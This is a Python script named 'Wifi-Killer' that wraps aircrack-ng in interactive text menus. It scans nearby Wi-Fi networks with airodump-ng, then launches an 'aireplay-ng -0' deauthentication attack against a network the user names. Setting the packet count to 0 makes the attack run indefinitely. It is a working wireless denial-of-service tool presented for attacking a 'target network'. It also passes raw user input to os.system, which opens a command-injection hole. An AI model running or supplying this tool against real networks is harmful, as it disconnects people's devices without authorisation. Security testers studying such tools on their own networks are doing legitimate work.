import os
import time
from termcolor import colored

os.system("clear")

print(colored("  __        __  _    __   _           _   __ _   _   _               ", 'blue'))
print(colored("  \ \      / / (_)  / _| (_)         | | / /(_) | | | |   ___   _ __ ", 'blue'))
print(colored("   \ \ /\ / /  | | | |_  | |  _____  | |/ / | | | | | |  / _ \ | '__|", 'blue'))
print(colored("    \ V  V /   | | |  _| | | |_____| |   <  | | | | | | |  __/ | |   ", 'blue'))
print(colored("     \_/\_/    |_| |_|   |_|         |_|\_\ |_| |_| |_|  \___| |_| \n", 'blue'))
print(colored("                                           [i]   -   Created By F34RZ", 'red' ))

time.sleep(2)                   


print(colored("[i]   -   Do I need to scan the network around you?", 'yellow'))
scan = input("(y/n): ")

if scan == "y":

    os.system("clear")

    print(colored(" [SCAN STARTED]", 'green'))
    print("")
    print("")
    print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
    print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
    print(colored("| |                                                               | |", 'green'))
    print(colored("| |       Enter the interface of your network card                | |", 'green'))
    print(colored("| |        to scan networks (wlan0, wlan1, etc.)                  | |", 'green'))
    print(colored("| |                                                               | |", 'green'))
    print(colored("| |                                        [SCAN INTERFACE]       | |", 'green'))
    print(colored("| |                                                               | |", 'green'))
    print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
    print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
    print("")

    wifi_scan = input("Wifi scanning interface: ")

    os.system("clear")
    
    print(colored("[i]   -   Press Ctrl + C to stop scanning,", 'red'))
    print(colored("          and attack your target network\n", 'red'))
    print(colored("                     Loading...", 'green'))

    time.sleep(3)  

    #Start Scanning Networks
    os.system("airodump-ng " + wifi_scan)

    print("")
    print(colored("[i]   -   Scanning stopped by user", 'red'))

    time.sleep(2)  

    os.system("clear")

else:
    
    os.system("clear")

    #Scan skipped
    print(colored("[SCAN SKIPPED]\n", 'red'))
    time.sleep(2)

print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
print(colored("| |                                                               | |", 'green'))
print(colored("| |       Enter the interface of your network card                | |", 'green'))
print(colored("| |        to attack network (wlan0, wlan1, etc.)                 | |", 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("| |                                             [ATTACK INTERFACE]| |", 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
print("")


wifi_attack = input("Wifi attack interface: ")



os.system("clear")


print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
print(colored("| |                                                               | |", 'green'))
print(colored("| |           Enter the name                                      | |", 'green'))
print(colored("| |          of the selected access point                         | |", 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
print("")

#Wifi acces point name
essid = input("Wifi ESSID: ")

os.system("clear")


print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
print(colored("| |                                                               | |", 'green'))
print(colored("| |       Enter the channel on which the                          | |", 'green'))
print(colored("| |        network is routed  (1,2,3,4...)                        | |", 'green'))
print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
print("")
channel = input("Channel: ")

#Set New Channel
os.system("iwconfig " + wifi_attack + " channel " + channel)


os.system("clear")


print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
print(colored("| |                                                               | |", 'green'))
print(colored("| |       Enter the number of packets that will be sent,          | |", 'green'))
print(colored("| |    If you set the value to 0, then the attack will be forever.| |", 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
print("")

packets = input("Number of packets: ")

os.system("clear")

print("")
print(colored("   ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___   ", 'green'))  
print(colored(" _|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|_ ", 'green')) 
print(colored("| |                                                               | |", 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("| |    Attack  Adapter   -                                        | |" + wifi_attack,'green'))
print(colored("| |    Network Essid     -                                        | |" + essid, 'green'))
print(colored("| |    Network Channel   -                                        | |" + channel, 'green'))
print(colored("| |    Number of Packets -                                        | |" + packets, 'green'))
print(colored("| |                                                               | |", 'green'))
print(colored("|_|___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___ ___|_|", 'green'))  
print(colored("  |___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|___|  ", 'green')) 
print("")

time.sleep(2)  

#Attack start
print(colored("   [i]   -   Attack starts in 3", 'red'))
time.sleep(1)
print(colored("             Attack starts in 2", 'red'))
time.sleep(1)
print(colored("             Attack starts in 1", 'red'))
time.sleep(1)


os.system("clear")

print("")
print(colored("   [i]   -   ATTACK STARTED ", 'green'))
print("")

#Attack
os.system("aireplay-ng -0 " + packets + " -e " + essid + " " + wifi_attack)

print("")
print(colored("   [i]   -   ATTACK STOPPED ", 'red'))